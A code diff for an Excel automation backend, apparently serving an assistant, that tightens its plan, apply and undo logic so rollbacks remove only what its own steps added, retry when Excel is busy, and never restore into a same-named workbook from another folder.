@@ -1422,18 +1840,18 @@ def h_pivot(cx: Cx, op: dict) -> dict:
             cx.pending.add(dest_name.lower())
         elif dest_name.lower() not in cx.pending:
             dws = _sheet(cx.wb, dest_name)
+            if name and any(str(p.Name).lower() == name.lower() for p in dws.PivotTables()):
+                raise Refusal(f"'{dest_name}' already has a pivot table called '{name}'", "exists")
             if int(cx.app.WorksheetFunction.CountA(_rng(dws, dr, dc, dr + 40, dc + 12))):
                 raise Refusal(f"'{dest_name}' already holds something around {a1(dr, dc)}; give an empty place or leave dest_sheet out for a new sheet", "exists")
         return info
-    cx.undo({"kind": "pivot_added", "sheet": dest_name, "new_sheet": new_sheet})
+    # "before": the pivot tables already on that sheet. Putting this step back
+    # removes only what it added (it used to clear EVERY pivot table there when
+    # Excel refused the new one, the user's own included).
+    before = [] if new_sheet else [str(p.Name) for p in _sheet(cx.wb, dest_name).PivotTables()]
+    cx.undo({"kind": "pivot_added", "sheet": dest_name, "new_sheet": new_sheet, "before": before})
     if new_sheet:
-        was = cx.wb.ActiveSheet
-        dws = cx.wb.Worksheets.Add(None, cx.wb.Sheets(cx.wb.Sheets.Count))
-        dws.Name = dest_name
-        try:
-            was.Activate()
-        except Exception:  # noqa: BLE001
-            pass
+        dws = _add_named_sheet(cx, dest_name)
     else:
         dws = _sheet(cx.wb, dest_name)
     cx.touched[dest_name] = None
@@ -1533,6 +1951,7 @@ def h_name(cx: Cx, op: dict) -> dict:
         raise Refusal(f"'{name}' cannot be a name (letters, digits, _ and . only; it cannot look like a cell)", "bad_step")
     ref = str(_need(op, "refers_to")).strip()
     ref = ref if ref.startswith("=") else "=" + ref
+    _stays_inside(ref)
     info = {"op": "name", "where": name, "summary": f"name {ref[1:]} as '{name}'"}
     if cx.planning:
         return info
@@ -1724,12 +2143,38 @@ def op_plan(req: dict) -> dict:
     app, wb = _find_book(_apps(), req.get("workbook"))
     _guard_book(wb)
     cx = Cx(app, wb, planning=True, default_sheet=req.get("sheet") or "")
-    _run_steps(cx, ops)
+    _checked(wb, cx, ops)
     return {
         "ok": True, "workbook": str(wb.Name), "path": str(wb.FullName), "steps": cx.steps,
         "overwrites": cx.overwrites, "formulas_lost": cx.formulas_lost, "destructive": cx.destructive,
         "autosave": _autosave(wb), "calculation": _calc_words(app),
     }
+
+
+def _checked(wb: Any, cx: Cx, ops: "list[dict]") -> None:
+    """Check the steps. A refusal carries the workbook's place: its words can
+    quote sheet names and headings, and the daemon must be able to say "not a
+    folder Jarvis may read" instead of passing those on."""
+    try:
+        _run_steps(cx, ops)
+    except Refusal as r:
+        r.path = str(wb.FullName)  # type: ignore[attr-defined]
+        raise
+
+
+def _roll_back(app: Any, wb: Any, undo_path: str) -> dict:
+    """Put back what the finished steps of a failed ``apply`` changed. Excel
+    can be busy for a moment (the user started typing): tried a few times, and
+    a rollback that still cannot run is SAID (it used to surface as a plain
+    "Excel is busy", which the tool read as "nothing was changed")."""
+    for attempt in range(4):
+        try:
+            return _restore_file(app, wb, undo_path, forgiving=True)
+        except BaseException as exc:  # noqa: BLE001
+            if not _is_busy(exc) or attempt == 3:
+                return {"left": ["Excel stopped taking requests while the steps were being put back"], "restored": 0}
+            time.sleep(0.5 * (attempt + 1))
+    return {"left": ["the steps could not be put back"], "restored": 0}
 
 
 def _autosave(wb: Any) -> bool:
@@ -1745,7 +2190,7 @@ def op_apply(req: dict) -> dict:
     _guard_book(wb)
     undo_path = str(req.get("undo_path") or "")
     # Everything is checked before anything is changed.
-    _run_steps(Cx(app, wb, planning=True, default_sheet=req.get("sheet") or ""), ops)
+    _checked(wb, Cx(app, wb, planning=True, default_sheet=req.get("sheet") or ""), ops)
     copy = str(req.get("copy_path") or "")
     if copy and any(str(o.get("op")) in DESTRUCTIVE_OPS for o in ops):
         wb.SaveCopyAs(copy)  # what the workbook was, before a step that cannot be put back
@@ -1760,7 +2205,7 @@ def op_apply(req: dict) -> dict:
         _run_steps(cx, ops)
     except BaseException as exc:
         # All or nothing: put back what the finished steps changed.
-        rolled = _restore_file(app, wb, undo_path, forgiving=True) if undo_path else {"left": ["no undo record was kept"]}
+        rolled = _roll_back(app, wb, undo_path) if undo_path else {"left": ["no undo record was kept"]}
         words = exc.words if isinstance(exc, Refusal) else (BUSY_WORDS if _is_busy(exc) else f"Excel refused: {_excel_words(exc)}")
         done = len(cx.steps)
         if rolled.get("left"):
@@ -1771,8 +2216,11 @@ def op_apply(req: dict) -> dict:
     new_errors: list[str] = []
     for ws in wb.Worksheets:
         name = str(ws.Name)
+        was = before_errors.get(name, set())
+        if len(was) >= ERROR_CELLS_READ:
+            continue  # more errors than were read before: "new" cannot be told from "not read"
         for cell in _error_cells(ws):
-            if cell not in before_errors.get(name, set()) and len(new_errors) < 20:
+            if cell not in was and len(new_errors) < 20:
                 new_errors.append(f"{name}!{cell}")
     return {
         "ok": True, "workbook": str(wb.Name), "path": str(wb.FullName), "steps": cx.steps,
@@ -1852,34 +2300,58 @@ def _undo_step(app: Any, wb: Any, step: dict, forgiving: bool) -> "tuple[int, li
     try:
         ws = _sheet(wb, inv.get("sheet"))
     except Refusal:
-        return 0, [f"the sheet '{inv.get('sheet')}' is no longer there"]
+        # A step that never finished on a sheet that is not there made nothing.
+        return 0, ([] if after is None else [f"the sheet '{inv.get('sheet')}' is no longer there"])
     if kind == "cells":
         r1, c1, r2, c2 = parse_range(inv["address"])
         rows, cols = r2 - r1 + 1, c2 - c1 + 1
         rng = _rng(ws, r1, c1, r2, c2)
         done = 0
         if "formulas" in inv:
+            if rows * cols > 1 and _filter_hides(ws, rng):
+                # A block written across rows a filter hides lands on the wrong rows.
+                return 0, [f"rows on {ws.Name} are hidden by a filter, so {ws.Name}!{inv['address']} was left as it is; "
+                           "show every row in Excel (Data > Clear) and undo again"]
             prior = inv["formulas"]
+            # Text is written back with Excel's text mark, or "00123" would
+            # come back as the number 123 and "1/2" as a date.
+            marked = {(i, j) for i, j in inv.get("text") or []}
+            back = [[("'" + f) if (i, j) in marked else f for j, f in enumerate(row)] for i, row in enumerate(prior)]
+            for addr, _formula in inv.get("arrays") or []:  # written below, each as ONE array
+                ar1, ac1, ar2, ac2 = parse_range(addr)
+                for i in range(max(ar1, r1) - r1, min(ar2, r2) - r1 + 1):
+                    for j in range(max(ac1, c1) - c1, min(ac2, c2) - c1 + 1):
+                        back[i][j] = ""
             now = _formulas(rng, rows, cols)
             want = (after or {}).get("formulas")
+            skipped: list[str] = []
             if forgiving or want is None or now == want:
-                rng.Formula = tuple(tuple(r) for r in prior)
+                _put_formula(rng, tuple(tuple(r) for r in back))
                 done = rows * cols
             else:
-                skipped = []
                 for i in range(rows):
                     for j in range(cols):
                         if now[i][j] == want[i][j]:
                             if now[i][j] != prior[i][j]:
-                                ws.Cells(r1 + i, c1 + j).Formula = prior[i][j]
+                                _put_formula(ws.Cells(r1 + i, c1 + j), back[i][j])
                             done += 1
                         else:
                             skipped.append(a1(r1 + i, c1 + j))
                 if skipped:
                     shown = ", ".join(skipped[:8]) + (f" and {len(skipped) - 8} more" if len(skipped) > 8 else "")
                     left.append(f"{ws.Name}!{shown} changed again since, so {'it was' if len(skipped) == 1 else 'they were'} left as {'it is' if len(skipped) == 1 else 'they are'}")
+            if not skipped:
+                for addr, formula in inv.get("arrays") or []:
+                    ws.Range(addr).FormulaArray = formula  # one array again, not a formula in each cell
+                _put_moved_back(ws, inv)  # what a sort carried along with the rows
+                if inv.get("formats_lost"):
+                    left.append(f"some formatting the sort moved on {ws.Name}!{inv['address']} could not be put back exactly")
+            elif inv.get("col_formats") or inv.get("notes") or inv.get("formats_lost"):
+                left.append(f"the colours and notes the sort moved on {ws.Name}!{inv['address']} were left where they are")
         if "formats" in inv:
-            _restore_formats(rng, rows, cols, inv["formats"])
+            changed = _restore_formats_checked(rng, rows, cols, inv["formats"], None if forgiving else (after or {}).get("formats"))
+            if changed:
+                left.append(f"the formatting of {changed} cell(s) on {ws.Name}!{inv['address']} was changed again since, so it was left as it is")
             if any("lost" in v for v in inv["formats"].values()):
                 left.append(f"some formatting on {ws.Name}!{inv['address']} was mixed and could not be put back exactly")
             done = done or rows * cols
@@ -1926,6 +2398,12 @@ def _undo_step(app: Any, wb: Any, step: dict, forgiving: bool) -> "tuple[int, li
         if not forgiving and after is not None and _validation_now(rng) != after.get("now"):
             return 0, [f"the rule on {ws.Name}!{inv['address']} was changed since"]
         _validation_put(rng, inv.get("prior"))
+        for i, row in enumerate(inv.get("cells") or []):  # rules only some of the cells had
+            for j, held in enumerate(row):
+                if held:
+                    _validation_put(rng.Cells(i + 1, j + 1), held)
+        if inv.get("lost"):
+            left.append(f"the rules some cells of {ws.Name}!{inv['address']} had before could not be put back")
         return 1, left
     if kind in ("chart_added", "table_added"):
         name = (after or {}).get("name")
@@ -1936,6 +2414,10 @@ def _undo_step(app: Any, wb: Any, step: dict, forgiving: bool) -> "tuple[int, li
                 if kind == "chart_added":
                     obj.Delete()
                 else:
+                    try:
+                        obj.TableStyle = ""  # or the table's colours stay behind as plain formatting
+                    except Exception:  # noqa: BLE001
+                        pass
                     obj.Unlist()
                 return 1, left
         return 0, left
@@ -1947,8 +2429,11 @@ def _undo_step(app: Any, wb: Any, step: dict, forgiving: bool) -> "tuple[int, li
         return 1, left
     if kind == "pivot_added":
         name = (after or {}).get("name")
+        was_there = set(inv.get("before") or [])
         for pt in list(ws.PivotTables()):
-            if not name or str(pt.Name) == name:
+            # Only what this step added: by its name once it was made, else
+            # whatever was not on the sheet before (never the user's own).
+            if (str(pt.Name) == name) if name else (str(pt.Name) not in was_there):
                 pt.TableRange2.Clear()
         if inv.get("new_sheet") and not int(app.WorksheetFunction.CountA(ws.Cells)):
             alerts = app.DisplayAlerts
@@ -1984,16 +2469,56 @@ def _restore_file(app: Any, wb: Any, path: str, *, forgiving: bool) -> dict:
     _head, steps = read_undo(path)
     restored = 0
     left: list[str] = []
-    for step in reversed(steps):
+    order = list(reversed(steps))
+    for pos, step in enumerate(order):
         try:
             n, why = _undo_step(app, wb, step, forgiving)
         except Exception as exc:  # noqa: BLE001
             if _is_busy(exc):
                 raise
-            n, why = 0, [f"step {step['i']} could not be put back: Excel refused: {_excel_words(exc)}"]
+            if "after" not in step and _never_made(wb, step):
+                # Written down, then refused by Excel before it changed anything
+                # (a protected sheet): nothing to put back, and nothing lost.
+                n, why = 0, []
+            else:
+                n, why = 0, [f"step {step['i']} could not be put back: Excel refused: {_excel_words(exc)}"]
         restored += n
         left.extend(why)
+        if not n and why and _moves_cells(step) and pos + 1 < len(order):
+            # Rows or columns are not where the earlier steps left them: putting
+            # those steps back by their cell addresses would write into other rows.
+            k = len(order) - pos - 1
+            left.append(f"the {k} step(s) made before that were left as they are (the rows and columns have moved since)")
+            break
     return {"restored": restored, "left": left, "steps": len(steps)}
+
+
+def _moves_cells(step: dict) -> bool:
+    """A step after which cells sit at other addresses for as long as it is
+    not put back: deleted rows or columns (never put back), inserted ones."""
+    inv = step.get("inverse") or {}
+    if "after" not in step:
+        return False
+    return bool(inv.get("moves")) or inv.get("kind") == "lines_inserted"
+
+
+def _never_made(wb: Any, step: dict) -> bool:
+    """Whether a cell step that was cut off left its cells exactly as they
+    were (so there is nothing to put back)."""
+    inv = step.get("inverse") or {}
+    if inv.get("kind") != "cells":
+        return False
+    try:
+        ws = _sheet(wb, inv.get("sheet"))
+        r1, c1, r2, c2 = parse_range(inv["address"])
+        rows, cols = r2 - r1 + 1, c2 - c1 + 1
+        rng = _rng(ws, r1, c1, r2, c2)
+        if "formulas" in inv and _formulas(rng, rows, cols) != inv["formulas"]:
+            return False
+        held = inv.get("formats") or {}
+        return not held or _read_formats(rng, rows, cols, sorted(held)) == {k: held[k] for k in sorted(held)}
+    except Exception:  # noqa: BLE001
+        return False
 
 
 def op_restore(req: dict) -> dict:
@@ -2002,10 +2527,10 @@ def op_restore(req: dict) -> dict:
     if not steps:
         raise Refusal("there is nothing recorded to put back", "nothing")
     apps = _apps()
-    try:
-        app, wb = _find_book(apps, head.get("path") or head.get("workbook"))
-    except Refusal:
-        app, wb = _find_book(apps, head.get("workbook"))
+    # By the place the workbook was open from, and nothing looser: another
+    # workbook that merely has the same NAME must never be "put back" (the
+    # review: Undo deleted blank rows in a same-named workbook of another folder).
+    app, wb = _find_book(apps, head.get("path") or head.get("workbook"), exact=True)
     _guard_book(wb)
     out = _restore_file(app, wb, path, forgiving=bool(req.get("forgiving")))
     return {"ok": True, "workbook": str(wb.Name), **out}
@@ -2031,7 +2556,10 @@ def answer(request: Any) -> dict:
             try:
                 return HANDLERS[request["op"]](request)
             except Refusal as r:
-                return {"ok": False, "code": r.code, "error": r.words}
+                out = {"ok": False, "code": r.code, "error": r.words}
+                if getattr(r, "path", ""):
+                    out["path"] = r.path  # type: ignore[attr-defined]
+                return out
             except Exception as exc:  # noqa: BLE001
                 last = exc
                 if not _is_busy(exc):
